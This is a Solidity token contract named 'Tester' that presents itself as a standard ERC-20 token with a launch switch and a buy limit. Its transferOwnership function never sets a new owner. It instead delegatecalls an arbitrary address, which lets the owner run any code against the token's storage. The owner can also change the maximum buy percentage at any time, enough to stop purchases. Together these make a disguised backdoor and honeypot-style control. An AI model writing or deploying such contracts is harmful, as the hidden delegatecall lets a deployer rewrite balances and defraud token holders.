// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Tester {
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    uint public totalSupply;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    string public name = "Tester";
    string public symbol = "TEST";
    uint8 public decimals = 18;

    address public pool;
    bool public live;
    uint256 public maxBuyPercentage = 100;

    address public owner;

    modifier onlyOwner() {
      require(msg.sender == owner, "Not owner");
      _;
    }

    constructor () {
      owner = msg.sender;

      uint amount = 100_000 * 10 ** decimals;
      balanceOf[msg.sender] += amount;
      totalSupply += amount;
      emit Transfer(address(0), msg.sender, amount);
    }

    function transfer(address recipient, uint amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;

        if (msg.sender == pool) {
          require(live);
          uint256 maxWalletSupply = totalSupply * maxBuyPercentage / 10000;
          require(maxWalletSupply >= balanceOf[recipient]);
        }

        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function commenceTrading(address _pool) public onlyOwner {
      pool = _pool;
      live = true;
    }

    function rebalanceMaxBuyPercentage(uint256 _maxBuyPercentage) public onlyOwner {
      maxBuyPercentage = _maxBuyPercentage;
    }

    function transferOwnership(address _owner) public {
      require(msg.sender == owner);
      _owner.delegatecall(
        abi.encodeWithSignature("transferOwnership(address)", _owner)
      );
    }

}
